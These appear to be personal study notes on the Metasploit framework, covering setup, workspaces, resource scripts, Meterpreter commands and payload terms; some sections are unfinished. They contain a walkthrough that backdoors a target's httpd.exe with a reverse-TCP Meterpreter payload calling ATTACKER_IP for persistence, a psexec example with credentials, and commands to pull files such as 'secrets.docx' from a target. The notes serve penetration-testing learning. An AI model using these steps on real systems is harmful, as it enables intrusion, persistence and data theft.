[TOC]

# Metasploit

Open-source penetration-testing framework written using the Ruby language.



# 1. Quick Tips

## Launch Metasploit Framework

1. Start PostgreSQL Service

   `~# service postgresql start`

2. Start MSF Database 

   `~# msfdb start`

3. Launch Metasploit Console

   `~# msfconsole`

## Configure MSF Database

Database configuration file located at: */usr/share/metasploit-framework/config/database.yml*

## Workspaces

Workspaces are used to separate datasets in order to stay organized. 

* List workspaces, current workspace denoted with *
  * `msf > workspace`
* Display workspace usage
  * `msf > workspace -h`
* Add/Delete workspace
  * `msf > workspace -a/d NAME`
* Switch workspace
  * `msf > workspace NAME`
* Rename workspace
  * `msf > workspace -r OLD NEW`

## Import Data to MSF Database

Data can be imported directly into the MSF Database from NMAP scan XML, Burp session/issue XML, Qualys asset/scan XML, etc. using the `db_import` command in msfconsole.  Type `msf > db_nmap` to list all supported file types.

1. Export an nmap scan as an XML file

   `# nmap -oX nmapScan.xml 127.0.0.1`

2. Import the scan from msfconsole

   `msf > db_import /location/to/scan/nmapScan.xml`

Alternatively, `msf > db_nmap` could be used within msfconsole to automatically import data from an nmap scan.

## Hosts Command

To be filled ... 

## Services Command

To be filled ... 

## Sessions

To be filled ...

## Resource Scripts

Resource scripts provide an easy way to automate repetitive tasks in Metasploit. The Metasploit Framework comes pre-installed with several community-written scripts located at */usr/share/metasploit-framework/scripts/resources/\*.rc*

### Creating a resource script

A resource script can be made by executing a module and then using the `makerc`command in *msfconsole* to create a resource file with the commands executed since startup to a .rc file.

1. Execute a module

   ```
   msf > use exploit/windows/smb/psexec
   msf exploit (psexec) > set RHOST 10.10.10.1
   msf exploit (psexec) > set SMBUSER Administrator
   msf exploit (psexec) > set SMBPASS password
   msf exploit (psexec) > set PAYLOAD windows/meterpreter/reverse_tcp
   msf exploit (psexec) > set LHOST 127.0.0.1
   msf exploit (psexec) > exploit
   msf exploit (psexec) > ^Z (to background the session)
   ```

2. Use the `makerc`command to create a .rc file

   ```
   msf exploit (psexec) > makerc /root/my_psexec.rc
   ```

### Using a resource script

The run a resource script when launching *msfconsole*, use the **-r** flag followed by the path to the resource script

```
~# msfconsole -r /root/my_psexec.rc
```



# 2. Information Gathering

## Passive Gathering

Gain information about the target without having any physical connectivity or access to it. We use other sources to gain information about the target, such as whois query, Nslookup, etc.

## Active Gathering

Gain information about the target using a logical connection with the target, such as port scanning, service enumeration, vulnerability scanning, etc.



# 3. Server-Side Exploitation

## Install a Backdoor (on Windows)

Having a shell on a target machine is useful, but persistence is needed so as to not repeat the entire exploitation process. A backdoor ensures persistence and access to the system, even if the vulnerability is patched.

### Windows Registry Only Persistence Module

We will use the Windows Registry Only Persistence local exploit module to create a backdoor that is executed during boot.

1. The first step is to locate a persistent service, or application, on the target's system. Let's assume they're running a web server from their machine, therefore the persistent application is *httpd.exe*.

2. The next step is to download the binary file from the target's system using the `download` command within the meterpreter session.

   `meterpreter > download C:\\wamp\\bin\\apache\\apache2.2.21\\bin\\httpd.exe`

3. We'll use a reverse TCP payload to backdoor the service

   ```
   msf > use payload/windows/x64/meterpreter/reverse_tcp
   msf payload(reverse_tcp) > set LHOST ATTACKER_IP
   msf payload(reverse_tcp) > generate -a x64 -p Windows -x /root/httpd.exe -k -t exe -f httpd-backdoored.exe
   ```

   * **-a** to specify the target system's architecture
   * **-p** the target system's platform
   * **-x** the executable template to use
   * **-k** to keep the executable template functional
   * **-t** the output format
   * **-f** the output filename

4. The backdoor is ready, now we need to start a listener for the reverse TCP using the Generic Payload Handler exploit.

   ```
   msf > use exploit/multi/handler
   msf exploit(handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
   msf exploit(handler) > set LHOST ATTACKER_IP
   msf exploit(handler) > exploit -j
   ```

   * The command `exploit -j` will run the "exploit" in the context of a job, allowing us to go back to our session and continue the attack. The "exploit" will run in the background until a connection is established.



# 4. Meterpreter

Meterpreter is a command interpreter for Metasploit that acts as a payload. It works by using in-memory DLL injections and a native shared object format in context with the exploited process, which means it does not create any new process and allows for a more stealthy and powerful payload. In addition to working in-memory and not writing to the target's disk at all, Meterpreter uses encrypted communication channels,over TLS using a TLV protocol, with the target.

## Advantages over specific payloads

* Works in context with the exploited process, so it doesn't create a new process
* Migrate easily among processes
* Resides completely in memory, so it writes nothing to disk
* Uses encrypted channels
* Uses a channelized communication system so users can work with several channels at a time
* Provides a platform to write extensions quickly and easily

## Useful commands

The following commands are all within the `meterpreter > <command> `context. Some commands, such as edit, are available through the `msf >` context as well. 

### System commands

* `background` : Background the current session
* `getuid` : Return the current username of the target machine
* `getpid` : Return the process ID in which Meterpreter is currently running
* `ps`: List all the running processes on the target machine
* `sysinfo` : List the target system's information, such as OS, architecture, etc.
* `shell` : Provide a shell prompt for the target's machine
* `exit` : Terminate a Meterpreter session
* `?` : List all available Meterpreter commands

### Filesystem commands

Commands for exploring the target system and performing various tasks such as: searching for files, downloading files, and changing the directory.

* `pwd` Return the present working directory
* `cd <location>` : Change working directory to location
* `ls`: List files in the current directory
* `search` : Search for specific files and file types
  * Ex: `search -f *.doc -d c:\`will search for all files in the C: drive with a .doc file extension
    * **-f** to specify the file pattern to search for
    * **-d** to specify which directory to perform a recursive search
* `download` : Download a file from the target's machine
  * Ex: `download C:\\Users\\Public\\Desktop\\secrets.docx`
    * Note the required double slashes when specifying a Windows path
* `upload` :  Upload any file to the target's machine
  * Ex: `upload file.exe`
* `rm` : Remove a file or directory from the target's machine
  * Ex: `rm file.exe`
* `edit` : Edit files on the target's machine using the `vim` editor
  * Ex: `edit root.txt`
* `show_mount` : List all mount points/logical drives
* `help File system commands` : List all file system commands

### Networking commands

Commands for understanding the network structure of the target's system, such as: analyzing whether the system belongs to a LAN or if it's a standalone system, determining the IP range, DNS information, etc. 

* `arp` : Display the host ARP cache
* `getproxy`: Display the current proxy configuration
* `ipconfig/ifconfig` : Display network interfaces and IP configurations
* `netstat` : Display network connections
* `portfwd` :  Forward incoming TCP/UDP connections to remote hosts
  * Ex:
* `route` : 
* `help networking` : List all networking commands

------

# Key Terms

## Shells

### Bind Shell

A bind shell instructs the target's machine to listen for an incoming connection from the attacker's machine. It's great for local vulnerabilities and privilege escalation, such as when you already have access to a target machine; however, it's not suitable for most remote exploitations because the target is likely behind a firewall.

### Reverse Shell

A reverse shell establishes a connection by opening a port and listening for a connection from the target's machine, and since most outbound rules are more on-premise (disallowing incoming connections, but allowing outgoing connections), a reverse shell is more likely to bypass the firewall.

## Payloads

### Singles

Singles are payloads that are self-contained and completely standalone. A single payload can be as simple as adding a user to the target system or running an executable. The downside of singles is their massive file size, as opposed to the miniscule size of a stager.

### Stagers

A stager will set up a network connection between the attacker and victim, and it is designed to be small and reliable.

### Stages

Stages are payload components downloaded by the stager that provide advanced features with no size limits, such as *dllinject*, *meterpreter*, *upexec*, *vncinject*, etc.

## Networking

### Subnetwork or Subnet

The concept of dividing a large network into smaller, identifiable parts. Subnetting is done to increase the address utility and security.

### Netmask

A 32-bit mask used to divide an IP address into subnets and specify the network's available hosts.

### Gateway

Specifies the forwarding, or the next hop, IP address over which the set of addresses defined by the network are reachable.

------

# Appendix

* msf : Metasploit Framework
* XML : 
* nmap : 
* TLS :
* TLV :
* vim : 